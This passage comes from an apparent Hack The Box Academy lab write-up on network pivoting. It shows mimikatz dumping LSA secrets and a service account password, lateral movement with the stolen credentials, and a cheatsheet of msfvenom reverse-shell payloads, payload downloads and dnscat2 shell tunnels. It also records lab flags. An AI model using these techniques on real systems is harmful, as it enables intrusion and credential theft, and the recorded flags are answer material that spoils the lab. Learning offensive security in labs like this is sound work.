</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.247<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-gxwarb3erc<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ssh mlefay@172.16.5.35
</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;172.16.5.35 (172.16.5.35)&#39;</span> can<span class=s1>&#39;t be established.
</span></span></span><span class=line><span class=cl><span class=s1>ECDSA key fingerprint is SHA256:eLsiZMYLSL7ZU18y5e5UweyshW/D9MJ2Rq4XuUqO/wc.
</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>172.16.5.35<span class=s1>&#39; (ECDSA) to the list of known hosts.
</span></span></span><span class=line><span class=cl><span class=s1>mlefay@172.16.5.35&#39;</span>s password: Plain Human work!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.17763.2628<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> <span class=m>2018</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mlefay@PIVOT-SRV01 C:<span class=se>\U</span>sers<span class=se>\m</span>lefay&gt; <span class=nb>exit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.247<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-gxwarb3erc<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ scp mimikatz.exe mlefay@172.16.5.35:<span class=s2>&#34;C:\\Users\\mlefay\\&#34;</span>
</span></span><span class=line><span class=cl>mlefay@172.16.5.35<span class=err>&#39;</span>s password: Plain Human work!
</span></span><span class=line><span class=cl>mimikatz.exe                                                  100% 1324KB   7.1MB/s   00:00
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>mlefay@PIVOT-SRV01 C:\Users\mlefay<span class=p>&gt;</span>type C:\Flag.txt
</span></span><span class=line><span class=cl>S1ngl3-Piv07-3@sy-Day
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mlefay@PIVOT-SRV01 C:\Users\mlefay<span class=p>&gt;</span>ipconfig
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Windows IP Configuration
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ethernet adapter Ethernet0:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Connection-specific DNS Suffix  . :
</span></span><span class=line><span class=cl>   Link-local IPv6 Address . . . . . : fe80::f084:7265:ec5f:bebe<span class=nv>%4</span>
</span></span><span class=line><span class=cl>   IPv4 Address. . . . . . . . . . . : 172.16.5.35
</span></span><span class=line><span class=cl>   Subnet Mask . . . . . . . . . . . : 255.255.0.0
</span></span><span class=line><span class=cl>   Default Gateway . . . . . . . . . : 172.16.5.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ethernet adapter Ethernet1 2:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Connection-specific DNS Suffix  . :
</span></span><span class=line><span class=cl>   Link-local IPv6 Address . . . . . : fe80::5d78:ecf:b016:4434<span class=nv>%5</span>
</span></span><span class=line><span class=cl>   IPv4 Address. . . . . . . . . . . : 172.16.6.35
</span></span><span class=line><span class=cl>   Subnet Mask . . . . . . . . . . . : 255.255.0.0
</span></span><span class=line><span class=cl>   Default Gateway . . . . . . . . . :
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mlefay@PIVOT-SRV01 C:\Users\mlefay<span class=p>&gt;</span>mimikatz.exe
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mimikatz # lsadump::secrets
</span></span><span class=line><span class=cl>Domain : PIVOT-SRV01
</span></span><span class=line><span class=cl>SysKey : eeefe7d6277a2ae258b4e571104cc289
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Local name : PIVOT-SRV01 ( S-1-5-21-1602415334-2376822715-119304339 )
</span></span><span class=line><span class=cl>Domain name : INLANEFREIGHT ( S-1-5-21-3858284412-1730064152-742000644 )
</span></span><span class=line><span class=cl>Domain FQDN : INLANEFREIGHT.LOCAL
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Policy subsystem is : 1.18
</span></span><span class=line><span class=cl>LSA Key(s) : 1, default {a4bf8c79-68b8-b086-46df-dc85da69e0c8}
</span></span><span class=line><span class=cl>  [00] {a4bf8c79-68b8-b086-46df-dc85da69e0c8} 39e6b5c93fa7690b499f6e6119a904d2bff37d9ed24d0b61bee460c1a7bd031d
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Secret  : $MACHINE.ACC
</span></span><span class=line><span class=cl>cur/text: z4PN$Qc?h1n&#39;mI`r<span class=p>&lt;</span>dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW<span class=se>^L</span>MUKkPQb!(P9\<span class=p>&lt;</span>$VDLWL+UL4KDZ<span class=p>&amp;</span>lh<span class=se>^Z</span>_[OEj;
</span></span><span class=line><span class=cl>Is4= 1GOR+3h<span class=p>&lt;</span>U/a[Q7#
</span></span><span class=line><span class=cl>    NTLM:21ce18b1a025d4b0b01c0e716e99d476
</span></span><span class=line><span class=cl>    SHA1:0f6097d8c745b1addfdfbbe733c1948e5d929527
</span></span><span class=line><span class=cl>old/text: z4PN$Qc?h1n&#39;mI`r<span class=p>&lt;</span>dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW<span class=se>^L</span>MUKkPQb!(P9\<span class=p>&lt;</span>$VDLWL+UL4KDZ<span class=p>&amp;</span>lh<span class=se>^Z</span>_[OEj;
</span></span><span class=line><span class=cl>Is4= 1GOR+3h<span class=p>&lt;</span>U/a[Q7#
</span></span><span class=line><span class=cl>    NTLM:21ce18b1a025d4b0b01c0e716e99d476
</span></span><span class=line><span class=cl>    SHA1:0f6097d8c745b1addfdfbbe733c1948e5d929527
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Secret  : DPAPI_SYSTEM
</span></span><span class=line><span class=cl>cur/hex : 01 00 00 00 2c 1b ed 0e 34 6a f0 6d 64 c3 2d cf d1 08 d8 fb 3a f1 e3 53 8a 88 8d cf 7b ec c6 9d 40 6
</span></span><span class=line><span class=cl>5 ca f2 6b 6a 53 4a b1 60 14 4c
</span></span><span class=line><span class=cl>    full: 2c1bed0e346af06d64c32dcfd108d8fb3af1e3538a888dcf7becc69d4065caf26b6a534ab160144c
</span></span><span class=line><span class=cl>    m/u : 2c1bed0e346af06d64c32dcfd108d8fb3af1e353 / 8a888dcf7becc69d4065caf26b6a534ab160144c
</span></span><span class=line><span class=cl>old/hex : 01 00 00 00 51 9c 86 b4 cb dc 97 8b 35 9b c0 39 17 34 16 62 31 98 c1 07 ce 7d 9f 94 fc e7 2c d9 59 8
</span></span><span class=line><span class=cl>a c6 07 10 78 7c 0d 9a 56 ce 0b
</span></span><span class=line><span class=cl>    full: 519c86b4cbdc978b359bc039173416623198c107ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
</span></span><span class=line><span class=cl>    m/u : 519c86b4cbdc978b359bc039173416623198c107 / ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Secret  : NL$KM
</span></span><span class=line><span class=cl>cur/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 6
</span></span><span class=line><span class=cl>4 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
</span></span><span class=line><span class=cl>old/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 6
</span></span><span class=line><span class=cl>4 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Secret  : _SC_DHCPServer / service &#39;DHCPServer&#39; with username : INLANEFREIGHT\vfrank
</span></span><span class=line><span class=cl>cur/text: Imply wet Unmasked!
</span></span><span class=line><span class=cl>old/text: Imply wet Unmasked!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Secret  : _SC_SCardSvr / service &#39;SCardSvr&#39; with username : INLANEFREIGHT\vfrank
</span></span><span class=line><span class=cl>cur/text: Imply wet Unmasked!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mimikatz #exit
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mlefay@PIVOT-SRV01 C:\Users\mlefay<span class=p>&gt;</span>for /L <span class=nv>%i in (1 1 254) do ping 172.16.5.%</span>i -n 1 -w 100 <span class=p>|</span> find <span class=s2>&#34;Reply&#34;</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>SNIP
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>mlefay@PIVOT-SRV01 C:\Users\mlefay<span class=p>&gt;</span>ping 172.16.6.35 -n 1 -w 100   <span class=p>|</span> find <span class=s2>&#34;Reply&#34;</span>
</span></span><span class=line><span class=cl>Reply from 172.16.6.35: bytes=32 time<span class=p>&lt;</span>1ms TTL=128
</span></span></code></pre></div><p>172.16.5.35 - C:\Flag.txt: <code>S1ngl3-Piv07-3@sy-Day</code></p><p>Found: <code>INLANEFREIGHT\vfrank:Imply wet Unmasked!</code> and the IP <code>172.16.6.35</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=go>C:\Users\vfrank&gt;for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find &#34;Reply&#34;
</span></span></span><span class=line><span class=cl><span class=go>...
</span></span></span><span class=line><span class=cl><span class=go>C:\Users\vfrank&gt;ping 172.16.6.25 -n 1 -w 100   | find &#34;Reply&#34;
</span></span></span><span class=line><span class=cl><span class=go>Reply from 172.16.6.25: bytes=32 time&lt;1ms TTL=128
</span></span></span><span class=line><span class=cl><span class=go>...
</span></span></span><span class=line><span class=cl><span class=go>C:\Users\vfrank&gt;ping 172.16.6.35 -n 1 -w 100   | find &#34;Reply&#34;
</span></span></span><span class=line><span class=cl><span class=go>Reply from 172.16.6.35: bytes=32 time&lt;1ms TTL=128
</span></span></span><span class=line><span class=cl><span class=go>...
</span></span></span><span class=line><span class=cl><span class=go>C:\Users\vfrank&gt;ping 172.16.6.45 -n 1 -w 100   | find &#34;Reply&#34;
</span></span></span><span class=line><span class=cl><span class=go>Reply from 172.16.6.45: bytes=32 time=1ms TTL=64
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.247<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-zjez6mclrz<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ proxychains xfreerdp /v:172.16.6.25 /u:<span class=s2>&#34;INLANEFREIGHT\vfrank&#34;</span> /p:<span class=s2>&#34;Imply wet Unmasked!&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=go>C:\Users\vfrank&gt;type C:\\Flag.txt
</span></span></span><span class=line><span class=cl><span class=go>N3tw0rk-H0pp1ng-f0R-FuN
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\vfrank&gt;ipconfig
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Windows IP Configuration
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Ethernet adapter Ethernet0 2:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>   Connection-specific DNS Suffix  . :
</span></span></span><span class=line><span class=cl><span class=go>   Link-local IPv6 Address . . . . . : fe80::d05f:823d:172b:595%9
</span></span></span><span class=line><span class=cl><span class=go>   IPv4 Address. . . . . . . . . . . : 172.16.6.25
</span></span></span><span class=line><span class=cl><span class=go>   Subnet Mask . . . . . . . . . . . : 255.255.0.0
</span></span></span><span class=line><span class=cl><span class=go>   Default Gateway . . . . . . . . . : 172.16.6.1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Ethernet adapter Ethernet1 2:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>   Connection-specific DNS Suffix  . :
</span></span></span><span class=line><span class=cl><span class=go>   Link-local IPv6 Address . . . . . : fe80::cd46:a4fe:f119:c745%4
</span></span></span><span class=line><span class=cl><span class=go>   IPv4 Address. . . . . . . . . . . : 172.16.10.25
</span></span></span><span class=line><span class=cl><span class=go>   Subnet Mask . . . . . . . . . . . : 255.255.0.0
</span></span></span><span class=line><span class=cl><span class=go>   Default Gateway . . . . . . . . . :
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\vfrank&gt;for /L %i in (1 1 254) do ping 172.16.10.%i -n 1 -w 100 | find &#34;Reply&#34;
</span></span></span><span class=line><span class=cl><span class=go>...
</span></span></span><span class=line><span class=cl><span class=go>C:\Users\vfrank&gt;ping 172.16.10.5 -n 1 -w 100   | find &#34;Reply&#34;
</span></span></span><span class=line><span class=cl><span class=go>Reply from 172.16.10.5: bytes=32 time&lt;1ms TTL=128
</span></span></span></code></pre></div><p>172.16.6.25 - C:\Flag.txt: <code>N3tw0rk-H0pp1ng-f0R-FuN</code></p><h3 id=cheatsheet-4>Cheatsheet<a hidden class=anchor aria-hidden=true href=#cheatsheet-4>#</a></h3><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>ifconfig</code></td><td style=text-align:left>Linux-based command that displays all current network configurations of a system.</td></tr><tr><td style=text-align:left><code>ipconfig</code></td><td style=text-align:left>Windows-based command that displays all system network configurations.</td></tr><tr><td style=text-align:left><code>netstat -r</code></td><td style=text-align:left>Command used to display the routing table for all IPv4-based protocols.</td></tr><tr><td style=text-align:left><code>nmap -sT -p22,3306 &lt;IPaddressofTarget></code></td><td style=text-align:left>Nmap command used to scan a target for open ports allowing SSH or MySQL connections.</td></tr><tr><td style=text-align:left><code>ssh -L 1234:localhost:3306 Ubuntu@&lt;IPaddressofTarget></code></td><td style=text-align:left>SSH comand used to create an SSH tunnel from a local machine on local port 1234 to a remote target using port 3306.</td></tr><tr><td style=text-align:left><code>netstat -antp | grep 1234</code></td><td style=text-align:left>Netstat option used to display network connections associated with a tunnel created. Using grep to filter based on local port 1234.</td></tr><tr><td style=text-align:left><code>nmap -v -sV -p1234 localhost</code></td><td style=text-align:left>Nmap command used to scan a host through a connection that has been made on local port 1234.</td></tr><tr><td style=text-align:left><code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@&lt;IPaddressofTarget></code></td><td style=text-align:left>SSH command that instructs the ssh client to request the SSH server forward all data via port 1234 to localhost:3306.</td></tr><tr><td style=text-align:left><code>ssh -D 9050 ubuntu@&lt;IPaddressofTarget></code></td><td style=text-align:left>SSH command used to perform a dynamic port forward on port 9050 and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.</td></tr><tr><td style=text-align:left><code>tail -4 /etc/proxychains.conf</code></td><td style=text-align:left>Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place.</td></tr><tr><td style=text-align:left><code>proxychains nmap -v -sn 172.16.5.1-200</code></td><td style=text-align:left>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range 172.16.5.1-200 with increased verbosity (-v) disabling ping scan (-sn).</td></tr><tr><td style=text-align:left><code>proxychains nmap -v -Pn -sT 172.16.5.19</code></td><td style=text-align:left>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (-v), disabling ping discover (-Pn), and using TCP connect scan type (-sT).</td></tr><tr><td style=text-align:left><code>proxychains msfconsole</code></td><td style=text-align:left>Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.</td></tr><tr><td style=text-align:left><code>msf6 > search rdp_scanner</code></td><td style=text-align:left>Metasploit search that attempts to find a module called rdp*scanner.</td></tr><tr><td style=text-align:left><code>proxychains xfreerdp /v:&lt;IPaddressofTarget> /u:victor /p:pass@123</code></td><td style=text-align:left>Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.</td></tr><tr><td style=text-align:left><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080</code></td><td style=text-align:left>Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following lhost= on local port 8080 (LPORT=8080). Payload will take the form of an executable file called backupscript.exe.</td></tr><tr><td style=text-align:left><code>msf6 > use exploit/multi/handler</code></td><td style=text-align:left>Used to select the multi-handler exploit module in Metasploit.</td></tr><tr><td style=text-align:left><code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget>:~/</code></td><td style=text-align:left>Uses secure copy protocol (scp) to transfer the file backupscript.exe to the specified host and places it in the Ubuntu user&rsquo;s home directory (:~/).</td></tr><tr><td style=text-align:left><code>python3 -m http.server 8123</code></td><td style=text-align:left>Uses Python3 to start a simple HTTP server listening on port 8123. Can be used to retrieve files from a host.</td></tr><tr><td style=text-align:left><code>Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"</code></td><td style=text-align:left>PowerShell command used to download a file called backupscript.exe from a webserver (172.16.5.129:8123) and then save the file to location specified after -OutFile.</td></tr><tr><td style=text-align:left><code>ssh -R &lt;InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@&lt;ipAddressofTarget> -vN</code></td><td style=text-align:left>SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port 8080 on the attack host to port 80 on the target.</td></tr><tr><td style=text-align:left><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IPaddressofAttackHost -f elf -o backupjob LPORT=8080</code></td><td style=text-align:left>Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after LHOST= on port 8080 (LPORT=8080). Payload takes the form of an executable elf file called backupjob.</td></tr><tr><td style=text-align:left><code>msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</code></td><td style=text-align:left>Metasploit command that runs a ping sweep module against the specified network segment (RHOSTS=172.16.5.0/23).</td></tr><tr><td style=text-align:left><code>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done</code></td><td style=text-align:left>For Loop used on a Linux-based system to discover devices in a specified network segment.</td></tr><tr><td style=text-align:left><code>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"</code></td><td style=text-align:left>For Loop used on a Windows-based system to discover devices in a specified network segment.</td></tr><tr><td style=text-align:left><code>1..254 | % {"172.16.5.$($*): $(Test-Connection -count 1 -comp 172.15.5.$($\_) -quiet)"}</code></td><td style=text-align:left>PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment.</td></tr><tr><td style=text-align:left><code>msf6 > use auxiliary/server socks_proxy</code></td><td style=text-align:left>Metasploit command that selects the socks_proxy auxiliary module.</td></tr><tr><td style=text-align:left><code>msf6 auxiliary(server/socks_proxy) > jobs</code></td><td style=text-align:left>Metasploit command that lists all currently running jobs.</td></tr><tr><td style=text-align:left><code>socks4 127.0.0.1 9050</code></td><td style=text-align:left>Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.</td></tr><tr><td style=text-align:left><code>Socks5 127.0.0.1 1080</code></td><td style=text-align:left>Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used</td></tr><tr><td style=text-align:left><code>msf6 > use post/multi/manage/autoroute</code></td><td style=text-align:left>Metasploit command used to select the autoroute module.</td></tr><tr><td style=text-align:left><code>meterpreter > help portfwd</code></td><td style=text-align:left>Meterpreter command used to display the features of the portfwd command.</td></tr><tr><td style=text-align:left><code>meterpreter > portfwd add -l 3300 -p 3389 -r &lt;IPaddressofTarget></code></td><td style=text-align:left>Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.</td></tr><tr><td style=text-align:left><code>xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code></td><td style=text-align:left>Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.</td></tr><tr><td style=text-align:left><code>netstat -antp</code></td><td style=text-align:left>Used to display all (-a) active network connections with associated process IDs. -t displays only TCP connections.-n displays only numerical addresses. -p displays process IDs associated with each displayed connection.</td></tr><tr><td style=text-align:left><code>meterpreter > portfwd add -R -l 8081 -p 1234 -L &lt;IPaddressofAttackHost></code></td><td style=text-align:left>Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port 1234 listening on the IP address of the Attack Host.</td></tr><tr><td style=text-align:left><code>meterpreter > bg</code></td><td style=text-align:left>Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux</td></tr><tr><td style=text-align:left><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofAttackHost>:80</code></td><td style=text-align:left>Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.</td></tr><tr><td style=text-align:left><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofTarget>:8443</code></td><td style=text-align:left>Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.</td></tr><tr><td style=text-align:left><code>plink -D 9050 ubuntu@&lt;IPaddressofTarget></code></td><td style=text-align:left>Windows-based command that uses PuTTY&rsquo;s Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.</td></tr><tr><td style=text-align:left><code>sudo apt-get install sshuttle</code></td><td style=text-align:left>Uses apt-get to install the tool sshuttle.</td></tr><tr><td style=text-align:left><code>sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v</code></td><td style=text-align:left>Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (172.16.5.0).</td></tr><tr><td style=text-align:left><code>sudo git clone https://github.com/klsecservices/rpivot.git</code></td><td style=text-align:left>Clones the rpivot project GitHub repository.</td></tr><tr><td style=text-align:left><code>sudo apt-get install python2.7</code></td><td style=text-align:left>Uses apt-get to install python2.7.</td></tr><tr><td style=text-align:left><code>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></td><td style=text-align:left>Used to run the rpivot server (server.py) on proxy port 9050, server port 9999 and listening on any IP address (0.0.0.0).</td></tr><tr><td style=text-align:left><code>scp -r rpivot ubuntu@&lt;IPaddressOfTarget></code></td><td style=text-align:left>Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.</td></tr><tr><td style=text-align:left><code>python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</code></td><td style=text-align:left>Used to run the rpivot client (client.py) to connect to the specified rpivot server on the appropriate port.</td></tr><tr><td style=text-align:left><code>proxychains firefox-esr &lt;IPaddressofTargetWebServer>:80</code></td><td style=text-align:left>Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.</td></tr><tr><td style=text-align:left><code>python client.py --server-ip &lt;IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain> --username &lt;username> --password &lt;password></code></td><td style=text-align:left>Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.</td></tr><tr><td style=text-align:left><code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25</code></td><td style=text-align:left>Windows-based command that uses netsh.exe to configure a portproxy rule called v4tov4 that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.</td></tr><tr><td style=text-align:left><code>netsh.exe interface portproxy show v4tov4</code></td><td style=text-align:left>Windows-based command used to view the configurations of a portproxy rule called v4tov4.</td></tr><tr><td style=text-align:left><code>git clone https://github.com/iagox86/dnscat2.git</code></td><td style=text-align:left>Clones the dnscat2 project GitHub repository.</td></tr><tr><td style=text-align:left><code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></td><td style=text-align:left>Used to start the dnscat2.rb server running on the specified IP address, port (53) & using the domain inlanefreight.local with the no-cache option enabled.</td></tr><tr><td style=text-align:left><code>git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></td><td style=text-align:left>Clones the dnscat2-powershell project Github repository.</td></tr><tr><td style=text-align:left><code>Import-Module dnscat2.ps1</code></td><td style=text-align:left>PowerShell command used to import the dnscat2.ps1 tool.</td></tr><tr><td style=text-align:left><code>Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code></td><td style=text-align:left>PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (-Exec cmd).</td></tr><tr><td style=text-align:left><code>dnscat2> ?</code></td><td style=text-align:left>Used to list dnscat2 options.</td></tr><tr><td style=text-align:left><code>dnscat2> window -i 1</code></td><td style=text-align:left>Used to interact with an established dnscat2 session.</td></tr><tr><td style=text-align:left><code>./chisel server -v -p 1234 --socks5</code></td><td style=text-align:left>Used to start a chisel server in verbose mode listening on port 1234 using SOCKS version 5.</td></tr><tr><td style=text-align:left><code>./chisel client -v 10.129.202.64:1234 socks</code></td><td style=text-align:left>Used to connect to a chisel server at the specified IP address & port using socks</td></tr><tr><td style=text-align:left><code>git clone https://github.com/utoni/ptunnel-ng.git</code></td><td style=text-align:left>Clones the ptunnel-ng project GitHub repository.</td></tr><tr><td style=text-align:left><code>sudo ./autogen.sh</code></td><td style=text-align:left>Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.</td></tr><tr><td style=text-align:left><code>sudo ./ptunnel-ng -r10.129.202.64 -R22</code></td><td style=text-align:left>Used to start the ptunnel-ng server on the specified IP address (-r) and corresponding port (-R22).</td></tr><tr><td style=text-align:left><code>sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</code></td><td style=text-align:left>Used to connect to a specified ptunnel-ng server through local port 2222 (-l2222).</td></tr><tr><td style=text-align:left><code>ssh -p2222 -lubuntu 127.0.0.1</code></td><td style=text-align:left>SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.</td></tr><tr><td style=text-align:left><code>regsvr32.exe SocksOverRDP-Plugin.dll</code></td><td style=text-align:left>Windows-based command used to register the SocksOverRDP-PLugin.dll.</td></tr><tr><td style=text-align:left><code>netstat -antb | findstr 1080</code></td><td style=text-align:left>Windows-based command used to list TCP network connections listening on port 1080.</td></tr></tbody></table><h3 id=completion-2>Completion<a hidden class=anchor aria-hidden=true href=#completion-2>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/158 title="Link of Completion" target=_blank rel="nofollow noopener">Link of Completion</a></p><h2 id=active-directory-enumeration--attacks>Active Directory Enumeration & Attacks<a hidden class=anchor aria-hidden=true href=#active-directory-enumeration--attacks>#</a></h2><h3 id=scenario>Scenario<a hidden class=anchor aria-hidden=true href=#scenario>#</a></h3><p><strong>In Scope</strong></p><table><thead><tr><th style=text-align:left>Range/Domain</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>INLANEFREIGHT.LOCAL</code></td><td style=text-align:left>Customer domain to include AD and web services.</td></tr><tr><td style=text-align:left><code>LOGISTICS.INLANEFREIGHT.LOCAL</code></td><td style=text-align:left>Customer subdomain</td></tr><tr><td style=text-align:left><code>FREIGHTLOGISTICS.LOCAL</code></td><td style=text-align:left>Subsidiary company owned by Inlanefreight. External forest trust with 